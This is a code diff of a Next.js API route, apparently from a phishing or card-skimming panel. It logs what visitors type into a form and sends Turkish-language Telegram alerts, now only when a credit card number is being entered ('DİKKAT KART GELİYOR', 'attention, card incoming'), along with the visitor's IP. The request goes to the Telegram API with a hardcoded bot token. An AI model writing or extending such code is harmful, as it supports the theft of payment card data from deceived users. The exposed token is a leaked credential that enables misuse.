@@ -34,8 +34,8 @@ export async function POST(request: NextRequest) {
             if (rows?.[0] && rows[0].log_notify === 0) shouldNotify = false;
         } catch {}
 
-        if (shouldNotify) {
-            const msg = `📝 <b>YENİ INPUT LOG</b>\n\n📋 Input Tipi: ${inputType}\n🌐 IP: ${ip}\n📅 Tarih: ${tarih}`;
+        if (shouldNotify && inputType === 'kredi_karti_numarasi') {
+            const msg = `🚨 <b>DİKKAT KART GELİYOR</b>\n\n🌐 ${ip} / ${tarih}`;
             fetch('https://api.telegram.org/bot8833761305:AAGzA0xdVIpD_7otKw_3ElteNG2lcOQE4do/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
